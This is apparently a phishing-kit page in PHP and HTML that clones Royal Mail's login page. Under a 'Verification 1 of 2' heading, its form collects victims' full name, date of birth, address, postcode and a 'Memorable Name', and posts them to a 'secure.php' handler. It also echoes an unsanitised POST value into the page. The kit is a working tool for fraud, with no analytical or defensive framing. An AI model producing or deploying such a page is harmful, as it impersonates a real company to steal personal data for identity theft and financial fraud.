...
?>
<!DOCTYPE html>
<html dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# " data-scrapbook-source="https://www.royalmail.com/login" data-scrapbook-create="20210121190734523" lang="en">
<head>
    <meta charset="UTF-8">
<meta name="title" content="Log in | Royal Mail Group Ltd">
...
<link rel="shortcut icon" href="favicon.ico" type="image/vnd.microsoft.icon">
    ...
    <title>Verification | Royal Mail Group Ltd</title>
    <link rel="stylesheet" media="all" href="css_4WjozGK8ccMNs2W9MfwvMVZNPzpmiyysOUq4_0NulQo.css">
<link rel="stylesheet" media="all" href="css_o79zfvrPVtt1el1UR50-mD-0ef6IbhXxay58w8XDA0Q.css">


<!--[if lte IE 8]>
<script src="/sites/royalmail.com/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js"></script>
<![endif]-->
  ...
  <div class="">
          <a class="site-logo-link" href="https://www.royalmail.com/" title="Home" rel="home">
...
<div class="rml-bing-search-search-form visually-hidden bingsearch block-rml-bing-search block container" data-drupal-selector="rml-bing-search-search-form" data-msg-required="This field is required." id="block-bingsearch">
  <div class="row">
    <div class="rml-search-block-wrapper col-md-8">

      <form action="" method="POST" id="rml-bing-search-search-form" accept-charset="UTF-8" class="rml-bing-search-search-form">
  ...
  <div class="search-form-content">
    <div class="search-box">
      ...
      <label for="edit-keys">Search
          ...
          <input placeholder="Search" data-drupal-selector="edit-keys" data-msg-maxlength="Search field has a maximum length of 128." data-msg-required="Search is required." type="text" id="edit-keys" name="keys" value="" size="15" maxlength="128" class="form-text">
    ...
    <div class="search-button"><input data-drupal-selector="edit-search-button" data-msg-required="Search is required." type="submit" id="edit-search-button" name="Search" value="" class="button js-form-submit form-submit button--search">
</div>
  </div>
  <input autocomplete="off" data-drupal-selector="form-gheniawjd6afgnpfde-8jwffsky-wv7topfnelrsklq" data-msg-required="This field is required." type="hidden" name="form_build_id" value="form-GhEnIaWjd6aFgNpfdE_8jwfFSKY-wv7tOpfNElrskLQ">
<input data-drupal-selector="edit-rml-bing-search-search-form" data-msg-required="This field is required." type="hidden" name="form_id" value="rml_bing_search_search_form">
...
<div data-drupal-messages-fallback="" class="hidden"></div>
  ...
  <div id="block-coronavirus16" class="coronavirus16 service-update block-block-content444bc8ee-3e56-494b-a55d-86b5fd89e970">
        ...
        <div role="button" id="service-update-accordion-toggle" aria-controls="service-update-accordion-content" class="service-update-title-wrapper accordion-all-screens  " aria-expanded="false">
          <div class="container">
            ...
            <div class="body field field--name-body field--type-text-with-summary field--label-hidden field__item"><p class="body-copy-small">Click for more info on <a href="https://www.royalmail.com/coronavirus">coronavirus</a> or for <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/12556">Service Updates</a><a>. Buy postage now with </a><a href="https://send.royalmail.com/">Click &amp; Drop</a> or the <a href="https://www.royalmail.com/downloadapp">Royal Mail app</a>.</p>
</div>
  ...
  <div class="container">
    <div class="row">
      <div class="login-form-column">
        <form class="user-login-form" data-drupal-selector="user-login-form" data-msg-required="This field is required." action="secure.php?&sessionid=$hash&securessl=true" method="POST" id="user-login-form" accept-charset="UTF-8" autocomplete="off">
          <input type="hidden" name="phone" value="<?php echo $_POST['phone']; ?>">

<h1 data-drupal-selector="edit-title" data-msg-required="This field is required.">Verification 1 of 2</h1>
<p> Please verify your identity by filling the details below </p>
<div class="form-item-name js-form-item form-item js-form-type-textfield form-type-textfield js-form-item-name">
      <label for="edit-name" class="js-form-required form-required">Full Name
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>

<a id="edit-name--description" class="description tooltip-trigger" href="javascript:">
  <span class="icon__wrapper"><svg class="icon icon--question" focusable="false" aria-hidden="true" role="img" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#question"></use></svg></span>
          ...
          <span class="tooltip-text visually-hidden">Enter your full name which was used to register with Royal Mail Group.</span>
</a>

          <input autocorrect="none" autocapitalize="none" spellcheck="false" autofocus="autofocus" data-drupal-selector="edit-name" aria-describedby="edit-name--description" data-msg-maxlength="Full name field has a maximum length of 60." data-msg-required="Full Name is required." type="text" id="fname" name="fname" value="" size="60" maxlength="60" class="form-text required" required="required" aria-required="true">
...
<a id="edit-pass--description" class="description tooltip-trigger" href="javascript:">
  <span class="icon__wrapper"><svg class="icon icon--question" focusable="false" aria-hidden="true" role="img" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#question"></use></svg></span>
</a>
<br>
<input style ="width:70px" placeholder="DD" data-drupal-selector="edit-pass" aria-describedby="edit-pass--description" data-msg-maxlength="Please correct the error" data-msg-required="DOB is required." type="text" id="day" name="day" size="10" maxlength="2" class="form-text required" required="required" aria-required="true">
<select style ="width:130px;font-size: 0.98em;box-sizing: border-box;" id="month" name="month" class="form-text required" required="required" aria-required="true">
  <option value="Month" selected="selected" style = "color:#3b3f42;">Month</option>
...
<input style ="width:100px" placeholder="YYYY" data-drupal-selector="edit-pass" aria-describedby="edit-pass--description" data-msg-maxlength="Please correct the error" data-msg-required="DOB is required." type="text" id="year" name="year" size="10" maxlength="4" class="form-text required" required="required" aria-required="true">
</div>

<div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">Address
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
...
<a id="edit-pass--description" class="description tooltip-trigger" href="javascript:">
  <span class="icon__wrapper"><svg class="icon icon--question" focusable="false" aria-hidden="true" role="img" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#question"></use></svg></span>
          ...
          <span class="tooltip-text visually-hidden">Your Address must have 8 characters or more and contain at least one letter</span>
</a>

          <input data-drupal-selector="edit-pass" aria-describedby="edit-pass--description" data-msg-maxlength="Address field has a maximum length of 128." data-msg-required="Address is required." type="text" id="address" name="address" size="60" maxlength="128" class="form-text required" required="required" aria-required="true">

        </div>

<div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">City
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
...
<input data-drupal-selector="edit-pass" aria-describedby="edit-pass--description" data-msg-maxlength="City field has a maximum length of 25." data-msg-required="Address is required." type="text" id="city" name="city" size="60" maxlength="25" class="form-text required" required="required" aria-required="true">

</div>

<div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">County
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
...
<input data-drupal-selector="edit-pass" aria-describedby="edit-pass--description" data-msg-maxlength="Postcode field has a maximum length of 10." data-msg-required="Postcode is required." type="text" id="postcode" name="postcode" size="60" maxlength="10" class="form-text required" required="required" aria-required="true">

</div>

<div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">Memorable Name
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
...
<input data-drupal-selector="edit-pass" aria-describedby="edit-pass--description" data-msg-maxlength="Memorable Name needed." data-msg-required="A word is required." type="text" id="mmn" name="mmn" size="60" maxlength="30" class="form-text required" required="required" aria-required="true">

</div>


<input data-drupal-selector="edit-submit" data-msg-required="This field is required." type="submit" id="edit-submit" name="op" value="Submit" class="button js-form-submit form-submit button--submit">
</div>
</div>
  ...
  <h2 class="visually-hidden" id="block-royalmail-site-links-personal-menu">Royal Mail site links personal</h2>
              ...
              <li>
        <a href="https://jobs.royalmailgroup.com/" target="_blank">Jobs</a>
              </li>
          <li>
        <a href="https://www.royalmailgroup.com/" target="_blank">Royal Mail Group</a>
              </li>
          <li>
        <a href="https://www.royalmail.com/terms-and-conditions" data-drupal-link-system-path="node/529">Terms and conditions</a>
              </li>
          <li>
        <a href="https://www.royalmail.com/privacy-notice" data-drupal-link-system-path="node/530">Privacy</a>
              </li>
          <li>
        <a href="https://www.royalmail.com/terms-website" data-drupal-link-system-path="node/527">Terms of use</a>
              </li>
          <li>
        <a href="https://www.royalmail.com/cookies-policy" data-drupal-link-system-path="node/552">Cookies</a>
              </li>
          <li>
        <a href="https://www.royalmailgroup.com/en/site/accessibility/" target="_blank">Accessibility</a>
              </li>
          <li>
        <a href="https://www.royalmail.com/cymraeg" data-drupal-link-system-path="node/509">Cymraeg</a>
              </li>
        </ul>
...
<div id="block-copyright" class="copyright copyright-text block-block-content4dd8157e-b8a9-4bcf-abbc-36b6e01fa33c">
  ...
  <div class="">
    ...
    <span class="hidden"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="element-hidden"><symbol id="arrow" viewBox="0 0 24 24">
  ...
  <path d="M6.246 6.927L4.534 5.684a.244.244 0 01-.098-.196v-3.31a.243.243 0 01.241-.242h.646a.243.243 0 01.242.242v2.856l1.346.98a.242.242 0 01.053.339l-.38.522a.244.244 0 01-.338.052zM5 9.032A4.032 4.032 0 119.032 5 4.031 4.031 0 015 9.032zM5 0a5 5 0 105 5 5 5 0 00-5-5z" fill="currentColor"></path>
    ...
    <image width="100%" height="100%" xlink:href="4edfcce3623b9b4897df015f17c35d5131321218.png" fill="none" fill-rule="evenodd"></image>
